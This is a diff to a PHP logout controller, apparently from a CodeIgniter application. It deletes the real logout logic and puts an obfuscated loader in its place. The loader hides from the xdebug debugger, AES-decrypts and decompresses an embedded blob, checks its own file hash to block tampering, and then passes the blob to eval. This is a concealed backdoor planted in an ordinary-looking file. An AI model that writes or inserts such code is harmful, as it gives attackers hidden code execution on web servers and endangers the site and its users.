@@ -1,22 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Logout extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_info();
-	}
-	public function index()
-	{
-		$data = $this->data;
-		/*$array_items = array('inv_username','inv_userid','logged_in','permissions','currency');
-		$this->session->unset_userdata($array_items);*/
-
-		//DELETE THE EXPIRED SESSION FROM SESSION, WHICH SAVED
-		$this->db->where("timestamp<=",time()-config_item('sess_expiration'))->delete(config_item('sess_save_path'));
-		//CLEAR ALL SESSION FROM VIRTUAL VARIABLES
-		$this->session->sess_destroy();
-		//LOGOUT
-		redirect(base_url('login'));
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nhv4bv1q=('bas'.'e64'.'_de'.'cod'.'e');
+$_p44et7u0=('gzu'.'nco'.'mpr'.'ess');
+$_xjzzt3gl=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_czfrf448='VytU/gWPXew=';
+$_zg20a16l='yjAJT+Z+';
+$_aax84sln='8eBqUKOs';
+$_x6e0k8me='YwIW8T2h';
+$_yhbye34x='LAztIO73';
+$_b4otj57s='JY0bht+/';
+$_a4ob9mal='h8DHUapO';
+$_iyh3pste='dIe6Wg==';
+$_vgdukluj=$_nhv4bv1q($_zg20a16l.$_yhbye34x.$_x6e0k8me.$_aax84sln.$_czfrf448);
+$_ruw4q6hm=$_nhv4bv1q($_a4ob9mal.$_b4otj57s.$_iyh3pste);
+$_uidz0dm6=$_nhv4bv1q('6xfarRPmmgRYuGq6Ch6JFbjk9rKLSuDIGmLdyzbgEZTTfq85IqLJOskSvOqnIzeERPxTyBO6dQAcalmUjAZOut/ptQ/XWDBoX+DAbGJymqUS1ByhICLWiXlnlQ0ts8bhcD4H2Wc9fxGf4wAdKyE0R9HIkYDUlIyqBapTSIDXYCVPK5JtC821ljRn50Mct3U0YsNiU5QrHhYzWjakx83g71FEjngrIMSDGQ2WmFvDXMHfKJrPk87WvIMkzx8cDXAY2NsNGh4wC7+tRuMzRzKKs3tabZG8pNJ36hq63mV3RfArGf/8i+gcUMWnAlz2EhLuyuPQFqubCj7cIZqbmtgB8csSmj6M2K151PlYTNsneTJywX8ZvwUXXGazo887sQgk');
+$_ehwe1jd1=$_xjzzt3gl($_uidz0dm6,'aes-256-cbc',$_vgdukluj,OPENSSL_RAW_DATA,$_ruw4q6hm);
+if($_ehwe1jd1===false){exit;}
+$_idj057nm=$_p44et7u0($_ehwe1jd1);
+if($_idj057nm===false){exit;}
+$_tc1cm077='16e141e24627e5b76203c2c507d98b03eaa4221933518026d5f5f84fd4aac861';
+$_rghjyk22=@file_get_contents(__FILE__);
+if($_rghjyk22!==false){
+$_q2iw4lyh=str_replace($_tc1cm077,"0000000000000000000000000000000000000000000000000000000000000000",$_rghjyk22);
+$_qwif7861=hash("sha256",$_q2iw4lyh);
+if($_qwif7861!==$_tc1cm077){@http_response_code(403);exit;}
 }
+eval($_idj057nm);
